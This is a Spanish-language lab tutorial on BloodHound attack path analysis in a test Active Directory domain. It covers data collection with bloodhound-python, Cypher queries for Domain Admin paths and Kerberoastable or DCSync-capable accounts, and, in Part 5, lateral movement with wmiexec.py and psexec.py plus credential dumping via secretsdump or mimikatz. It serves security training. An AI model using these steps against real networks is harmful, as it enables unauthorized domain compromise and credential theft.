# Lab 04 — BloodHound Attack Path Analysis

## Objetivo

Usar BloodHound para visualizar relaciones en Active Directory, identificar rutas de ataque automáticamente y encontrar el camino más corto a Domain Admin.

---

## ¿Qué es BloodHound?

BloodHound representa el AD como un grafo: nodos (usuarios, grupos, computadoras) y aristas (relaciones: MemberOf, AdminTo, GenericAll, DCSync...). Permite responder preguntas como:

- ¿Qué usuario tiene el camino más corto a Domain Admin?
- ¿Quién tiene GenericAll sobre el DC?
- ¿Qué computadoras tienen sesiones activas de Domain Admins?

---

## Parte 1 — Recolectar datos con BloodHound Python

```bash
# Desde ad-tools, recolectar todo el dominio
bloodhound-python \
    -u jgarcia \
    -p "Password123!" \
    -d labthinktank.local \
    -dc 192.168.100.10 \
    -c All \
    -ns 192.168.100.10 \
    --zip \
    -o /workspace/reports/bloodhound/

# -c All incluye: Group, LocalAdmin, RDP, DCOM, PSRemote, Session, Trusts, ObjectProps, ACL, Container

# Output: un archivo .zip con JSONs
ls /workspace/reports/bloodhound/*.zip
```

---

## Parte 2 — Importar datos en BloodHound CE

```
1. Abrir http://localhost:8080
2. Login: admin / bloodhound (primer acceso → cambiar contraseña)
3. Administration → Upload Files
4. Seleccionar el .zip generado por bloodhound-python
5. Esperar la importación
```

---

## Parte 3 — Queries predefinidas (Cypher)

### Desde la interfaz BloodHound CE

```
Menú izquierdo → Explore → Cypher Query
```

#### Queries más útiles

```cypher
-- Todos los Domain Admins
MATCH (n:Group {name:"DOMAIN ADMINS@LABTHINKTANK.LOCAL"})<-[:MemberOf*1..]-(u:User)
RETURN u.name

-- Camino más corto a Domain Admin desde cualquier usuario
MATCH p=shortestPath(
    (u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@LABTHINKTANK.LOCAL"})
)
RETURN p

-- Usuarios kerberoasteables
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

-- Usuarios con AS-REP Roasting
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

-- Computadoras donde Domain Admins tienen sesión activa
MATCH (da:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@LABTHINKTANK.LOCAL"}),
      (da)-[:HasSession]->(c:Computer)
RETURN da.name, c.name

-- ACLs peligrosas: GenericAll sobre objetos de alto valor
MATCH p=(u:User)-[:GenericAll]->(n)
WHERE n:Computer OR n:User OR n:Group
RETURN p

-- Usuarios con DCSync rights
MATCH p=(u)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain)
RETURN p
```

---

## Parte 4 — Análisis de rutas predefinidas en BloodHound CE

```
Analysis tab → Pre-built Analytics:

Domain:
  - Find All Domain Admins
  - Find Shortest Path to Domain Admin
  - Find Principals with DCSync Rights
  - Find Computers where Domain Users are Local Admin

Kerberos:
  - List all Kerberoastable Accounts
  - List all AS-REP Roastable Users
  - Shortest path from Kerberoastable Users to Domain Admins

ACL:
  - Find Interesting ACLs
  - Find Objects with Dangerous ACLs
```

---

## Parte 5 — Identificar y explotar la ruta

Una vez identificado el camino:

```
jgarcia (IT-Admins)
    └── MemberOf → IT-Admins
        └── AdminTo → WORKSTATION01
            └── HasSession → sql_svc (Domain Admin)
                └── MemberOf → Domain Admins
```

```bash
# 1. jgarcia tiene admin en WORKSTATION01
# → conectarse y volcar credenciales de sql_svc en memoria
wmiexec.py labthinktank.local/jgarcia:Password123!@192.168.100.10
# (una vez dentro: secretsdump o mimikatz)

# 2. Con hash/password de sql_svc → Domain Admin
psexec.py labthinktank.local/sql_svc:sql_service_pass!@192.168.100.10
```

---

## Parte 6 — Marcar nodos como "Owned"

En BloodHound, marcar nodos comprometidos para visualizar el progreso:

```
1. Clic derecho sobre un nodo de usuario
2. Mark User as Owned
3. El nodo aparece con una calavera

4. Query: Find Shortest Path from Owned Principals to Domain Admins
```

---

## Actividades

1. Recolectar datos del dominio con `bloodhound-python` e importarlos en BloodHound CE
2. Identificar todas las cuentas kerberoasteables usando queries Cypher
3. Encontrar el camino más corto desde `jgarcia` hasta Domain Admin
4. Identificar qué usuarios tienen rights de DCSync
5. Documentar el attack path completo con capturas del grafo

---

## Mapeo MITRE ATT&CK

| Técnica | TTP |
|---------|-----|
| Domain Trust Discovery | T1482 |
| Permission Groups Discovery | T1069.002 |
| Remote System Discovery | T1018 |
| Account Discovery — Domain Account | T1087.002 |
